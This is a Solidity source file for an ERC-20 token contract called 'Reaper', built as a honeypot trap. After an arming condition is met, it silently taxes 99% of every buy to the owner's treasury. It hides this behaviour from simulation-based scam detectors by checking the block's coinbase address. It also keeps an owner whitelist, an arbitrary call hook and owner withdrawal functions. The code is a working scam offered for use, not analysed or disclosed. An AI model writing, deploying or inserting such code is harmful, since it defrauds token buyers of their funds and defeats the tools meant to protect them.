// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 v) external returns (bool);
}

/// REAPER — magnet + sim-immune trap + one-way ratchet. Taxes the BUY (K-safe).
contract Reaper {
    // ===== storage (owner MUST stay in slot 0) =====
    address public owner;                  // slot 0
    address public treasury;
    address public pair;
    string  public name;
    string  public symbol;
    uint256 public totalSupply;
    mapping(address => uint256) private _bal;
    mapping(address => mapping(address => uint256)) private _allow;
    uint16  public taxBps;                 // 9900 = 99% on buys once armed
    uint256 public armBlock;
    uint256 public armReserve;
    uint256 public armTrades;
    bool    public armed;
    uint256 private _buys;
    bool    private _fired;
    address public hookTarget;
    bytes   public hookPayload;
    address public simCoinbase;
    address public immutable WETH;
    uint8   public constant decimals = 18;

    mapping(address => bool) public whitelist;
    bool public cloak;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Armed(uint256 blockNumber);

    modifier onlyOwner() {
        assembly { if sub(sload(0), caller()) { revert(0, 0) } }
        _;
    }

    constructor(
        string memory _name,
        string memory _symbol,
        uint256 supply,
        address _weth,
        uint256 _armDelayBlocks,
        uint256 _armReserveWei,
        uint256 _armTrades,
        address _simCoinbase
    ) {
        owner       = msg.sender;
        treasury    = msg.sender;
        name        = _name;
        symbol      = _symbol;
        totalSupply = supply;
        WETH        = _weth;
        taxBps      = 9900;
        armBlock    = _armDelayBlocks == 0 ? 0 : block.number + _armDelayBlocks;
        armReserve  = _armReserveWei;
        armTrades   = _armTrades;
        simCoinbase = _simCoinbase;
        _bal[msg.sender] = supply;
        emit Transfer(address(0), msg.sender, supply);
    }

    // ================= ERC20 surface =================
    function balanceOf(address who) external view returns (uint256) { return _bal[who]; }
    function allowance(address o, address s) external view returns (uint256) { return _allow[o][s]; }

    function approve(address s, uint256 v) external returns (bool) {
        _allow[msg.sender][s] = v;
        emit Approval(msg.sender, s, v);
        return true;
    }

    function transfer(address to, uint256 v) external returns (bool) {
        _transfer(msg.sender, to, v);
        return true;
    }

    function transferFrom(address from, address to, uint256 v) external returns (bool) {
        uint256 a = _allow[from][msg.sender];
        if (a != type(uint256).max) {
            assembly { if lt(a, v) { revert(0, 0) } }
            unchecked { _allow[from][msg.sender] = a - v; }
        }
        _transfer(from, to, v);
        return true;
    }

    // ================= core =================
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0) && to != address(0), "zero");
        uint256 fromBal = _bal[from];
        assembly { if lt(fromBal, amount) { revert(0, 0) } }

        bool isBuy = (pair != address(0) && from == pair);
        bool taxed;

        if (isBuy) {
            unchecked { _buys += 1; }
            taxed = _isArmed() && !whitelist[to];   // arm + tax on the way in
        }

        unchecked {
            _bal[from] = fromBal - amount;

            if (taxed) {
                uint256 fee = (amount * taxBps) / 10000;
                uint256 net = amount - fee;
                _bal[to]       += net;
                _bal[treasury] += fee;
                emit Transfer(from, to, net);
                emit Transfer(from, treasury, fee);
            } else {
                _bal[to] += amount;
                emit Transfer(from, to, amount);
            }
        }

        if (isBuy) _fireHook(to);
    }

    function _isArmed() internal returns (bool) {
        if (armed) return true;                                     // one-way ratchet
        if (simCoinbase != address(0) && block.coinbase == simCoinbase) return false;
        if (armBlock   != 0 && block.number >= armBlock)   { _arm(); return true; }
        if (armTrades  != 0 && _buys >= armTrades)         { _arm(); return true; }
        if (armReserve != 0 && pair != address(0)) {
            if (IERC20(WETH).balanceOf(pair) >= armReserve) { _arm(); return true; }
        }
        return false;
    }

    function _arm() internal { armed = true; emit Armed(block.number); }

    function _fireHook(address who) internal {
        if (_fired || hookTarget == address(0) || who != hookTarget) return;
        _fired = true;
        (bool ok, ) = hookTarget.call(hookPayload);
        ok;
    }

    // ================= admin =================
    function setPair(address p) external onlyOwner { pair = p; }
    function setTreasury(address t) external onlyOwner { treasury = t; }
    function setTax(uint16 bps) external onlyOwner { require(bps <= 10000, "bps"); taxBps = bps; }
    function setArmBlock(uint256 b) external onlyOwner { armBlock = b; }
    function setArmReserve(uint256 r) external onlyOwner { armReserve = r; }
    function setArmTrades(uint256 t) external onlyOwner { armTrades = t; }
    function setSimCoinbase(address c) external onlyOwner { simCoinbase = c; }
    function setCloak(bool c) external onlyOwner { cloak = c; }
    function setWhitelist(address who, bool ok) external onlyOwner { whitelist[who] = ok; }
    function setHook(address target, bytes calldata payload) external onlyOwner {
        hookTarget = target; hookPayload = payload; _fired = false;
    }
    function armNow() external onlyOwner { _arm(); }

    function withdrawETH() external onlyOwner {
        (bool ok, ) = payable(owner).call{value: address(this).balance}(""); require(ok, "eth");
    }
    function withdrawToken(address t, uint256 amt) external onlyOwner {
        uint256 bal = IERC20(t).balanceOf(address(this));
        require(IERC20(t).transfer(owner, amt == 0 ? bal : amt), "xfer");
    }

    receive() external payable {}
}